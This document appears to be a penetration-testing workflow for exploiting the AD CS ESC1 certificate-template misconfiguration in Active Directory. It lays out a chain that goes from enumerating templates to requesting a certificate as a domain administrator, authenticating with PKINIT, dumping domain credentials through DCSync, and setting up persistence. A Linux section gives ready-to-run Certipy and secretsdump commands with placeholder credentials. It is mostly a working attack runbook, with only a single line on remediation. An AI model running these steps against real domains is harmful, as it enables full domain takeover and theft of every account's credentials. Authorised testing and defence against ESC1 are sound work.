# Workflows - AD CS ESC1 Exploitation

## ESC1 Attack Chain Workflow

```
1. Enumeration
   ├── Identify CA servers: Certify.exe cas / certipy find
   ├── List certificate templates: Certify.exe find
   ├── Filter for vulnerable templates: /vulnerable flag
   └── Verify ESC1 conditions (ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU)

2. Certificate Request
   ├── Choose target principal (Domain Admin, Enterprise Admin)
   ├── Request certificate with target UPN in SAN field
   ├── CA processes request without approval (misconfigured)
   └── Save issued certificate (PFX/PEM)

3. Authentication
   ├── Convert certificate format if needed (PEM → PFX)
   ├── Use PKINIT to request TGT with forged certificate
   ├── Rubeus (Windows): asktgt /certificate:<pfx>
   ├── Certipy (Linux): auth -pfx <certificate>
   └── Obtain TGT or NT hash for target account

4. Privilege Escalation
   ├── Use obtained TGT/hash for privileged operations
   ├── DCSync: Dump all domain credentials
   ├── Access Domain Controller shares
   └── Establish persistence as needed

5. Documentation
   ├── Screenshot each step of the attack chain
   ├── Record CA name, template name, and SAN used
   ├── Document credentials obtained
   └── Provide remediation guidance
```

## Certipy Full Attack Workflow (Linux)

```bash
# Step 1: Find vulnerable templates
certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1 -vulnerable

# Step 2: Request certificate as administrator
certipy req -u user@domain.local -p 'Password123' \
  -ca 'domain-CA' -target DC01.domain.local \
  -template VulnerableTemplate \
  -upn administrator@domain.local

# Step 3: Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# Step 4: Use recovered NT hash
secretsdump.py domain.local/administrator@DC01.domain.local -hashes :ntlmhash
```
